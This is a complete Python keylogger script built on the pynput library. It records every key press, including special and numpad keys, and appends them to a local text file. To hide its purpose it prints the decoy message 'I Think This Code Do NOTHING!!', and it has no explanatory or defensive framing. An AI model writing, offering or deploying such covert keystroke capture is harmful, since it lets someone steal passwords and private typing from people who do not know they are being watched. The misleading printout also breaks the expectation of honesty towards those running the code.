#!/usr/bin/python3

'''
========================================
||        pip install pynput          ||
========================================
'''

from pynput.keyboard import Listener

# Special keys map
special_keys = {
    'Key.space': ' ',
    'Key.enter': '\n',
    'Key.tab': '\t',
    'Key.backspace': '[BACKSPACE]',
    'Key.delete': '[DELETE]',
    'Key.esc': '[ESC]',
    'Key.shift': '',
    'Key.shift_r': '',
    'Key.shift_l': '',
    'Key.ctrl': '',
    'Key.ctrl_l': '',
    'Key.ctrl_r': '',
    'Key.alt': '',
    'Key.alt_l': '',
    'Key.alt_r': '',
    'Key.caps_lock': '',
    'Key.cmd': '',
    'Key.cmd_l': '',
    'Key.cmd_r': '',
    'Key.up': '[UP]',
    'Key.down': '[DOWN]',
    'Key.left': '[LEFT]',
    'Key.right': '[RIGHT]',
}

# Special key check function
def is_special_key(key):
    return str(key) in special_keys


def write_in_file(key):
    if is_special_key(key):
        key = special_keys[str(key)]

    elif key.vk >= 96 and key.vk <= 105: # Handel Numpad Numbers
        key = str(key.vk - 96)

    else:
        key = str(key).replace("'", "")

    with open("files/keystroke.txt", "a") as f:
        f.write(key)

print("hmmm... I Think This Code Do NOTHING!!")

with Listener(on_press=write_in_file) as l:
    l.join()
